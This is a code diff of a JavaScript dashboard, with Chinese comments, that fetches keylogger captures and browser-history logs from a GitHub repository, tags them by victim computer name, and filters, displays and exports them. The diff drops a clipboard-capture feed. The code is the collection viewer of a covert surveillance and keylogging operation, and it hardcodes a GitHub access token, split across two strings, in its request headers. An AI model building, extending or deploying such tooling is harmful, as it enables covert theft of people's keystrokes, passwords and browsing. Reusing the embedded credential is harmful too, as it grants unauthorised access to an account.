@@ -4,11 +4,10 @@ const CONFIG = {
     maxLogs: Infinity, // 移除記錄數量限制
     endpoints: {
         keyboard: 'https://api.github.com/repos/appy002255/text/contents/keylog.json',
-        browser: 'https://api.github.com/repos/appy002255/text/contents/browser_history.json',
-        clipboard: 'https://api.github.com/repos/appy002255/text/contents/clipboard.json'
+        browser: 'https://api.github.com/repos/appy002255/text/contents/browser_history.json'
     },
     headers: {
-        'Authorization': 'Bearer ' + 'ghp_VYuzgVnERDLA' + 'MHUf58iqBVxPBWRvxY1ALCuI',
+        'Authorization': 'Bearer ghp_VYuzgVnERDLA' + 'MHUf58iqBVxPBWRvxY1ALCuI',
         'Accept': 'application/vnd.github.v3+json',
         'X-GitHub-Api-Version': '2022-11-28'
     }
@@ -108,9 +107,8 @@ function filterLogs() {
     return allLogs.filter(log => {
         // 類型過濾
         if (typeFilter) {
-            if (typeFilter === 'keyboard' && (log.browser_history || log.is_clipboard)) return false;
-            if (typeFilter === 'browser' && (!log.browser_history || log.is_clipboard)) return false;
-            if (typeFilter === 'clipboard' && !log.is_clipboard) return false;
+            if (typeFilter === 'keyboard' && log.browser_history) return false;
+            if (typeFilter === 'browser' && !log.browser_history) return false;
         }
         
         // 電腦名稱過濾
@@ -184,7 +182,6 @@ function displayLogs(logs) {
         
         // 獲取基本信息
         const isBrowserLog = log.browser_history === true;
-        const isClipboardLog = log.is_clipboard === true;
         const timestamp = new Date(log.timestamp).toLocaleTimeString('zh-TW');
         const date = new Date(log.timestamp).toLocaleDateString('zh-TW', {
             year: 'numeric',
@@ -208,7 +205,7 @@ function displayLogs(logs) {
         }
         
         // 準備內容
-        const icon = isClipboardLog ? '📋' : (isBrowserLog ? '🌐' : '⌨️');
+        const icon = isBrowserLog ? '🌐' : '⌨️';
         const computerName = log.computer_name || '未知電腦';
         
         // 組合顯示內容
@@ -250,34 +247,43 @@ function exportLogs() {
 // 加載日誌
 async function loadLogs() {
     try {
+        showStatus('正在載入記錄...');
+        
         // 獲取鍵盤記錄
         const keyboardResponse = await fetch(CONFIG.endpoints.keyboard, {
-            headers: CONFIG.headers
+            headers: CONFIG.headers,
+            cache: 'no-cache'
         });
         
         // 獲取瀏覽器記錄
         const browserResponse = await fetch(CONFIG.endpoints.browser, {
-            headers: CONFIG.headers
+            headers: CONFIG.headers,
+            cache: 'no-cache'
         });
         
-        // 獲取剪貼簿記錄
-        const clipboardResponse = await fetch(CONFIG.endpoints.clipboard, {
-            headers: CONFIG.headers
-        });
+        if (!keyboardResponse.ok) {
+            console.warn('無法獲取鍵盤記錄');
+            throw new Error('無法獲取鍵盤記錄');
+        }
+        
+        if (!browserResponse.ok) {
+            console.warn('無法獲取瀏覽器記錄');
+            throw new Error('無法獲取瀏覽器記錄');
+        }
+        
+        const keyboardData = await keyboardResponse.json();
+        const browserData = await browserResponse.json();
         
         // 初始化記錄數組
         let keyboardLogs = [];
         let browserLogs = [];
-        let clipboardLogs = [];
         
         // 處理鍵盤記錄
         if (keyboardResponse.ok) {
-            const keyboardData = await keyboardResponse.json();
             keyboardLogs = decodeBase64Content(keyboardData.content).map(log => ({
                 ...log,
                 display_text: log.text,
-                browser_history: false,
-                is_clipboard: false
+                browser_history: false
             }));
         } else {
             console.warn('無法獲取鍵盤記錄');
@@ -285,7 +291,6 @@ async function loadLogs() {
         
         // 處理瀏覽器記錄
         if (browserResponse.ok) {
-            const browserData = await browserResponse.json();
             const browserHistoryContent = decodeBase64Content(browserData.content);
             browserLogs = Array.isArray(browserHistoryContent) ? browserHistoryContent.map(log => {
                 if (!log || typeof log !== 'object') {
@@ -294,7 +299,6 @@ async function loadLogs() {
                 }
                 return {
                     browser_history: true,
-                    is_clipboard: false,
                     timestamp: log.timestamp || new Date().toISOString(),
                     computer_name: log.computer || '未知電腦',
                     display_text: log.url || log.text || '',
@@ -308,22 +312,8 @@ async function loadLogs() {
             console.warn('無法獲取瀏覽器記錄');
         }
         
-        // 處理剪貼簿記錄
-        if (clipboardResponse.ok) {
-            const clipboardData = await clipboardResponse.json();
-            const clipboardContent = decodeBase64Content(clipboardData.content);
-            clipboardLogs = Array.isArray(clipboardContent) ? clipboardContent.map(log => ({
-                ...log,
-                browser_history: false,
-                is_clipboard: true,
-                display_text: log.content || ''
-            })) : [];
-        } else {
-            console.warn('無法獲取剪貼簿記錄');
-        }
-        
         // 合併所有記錄
-        allLogs = [...keyboardLogs, ...browserLogs, ...clipboardLogs];
+        allLogs = [...keyboardLogs, ...browserLogs];
         
         // 更新過濾器
         updateFilters(allLogs);
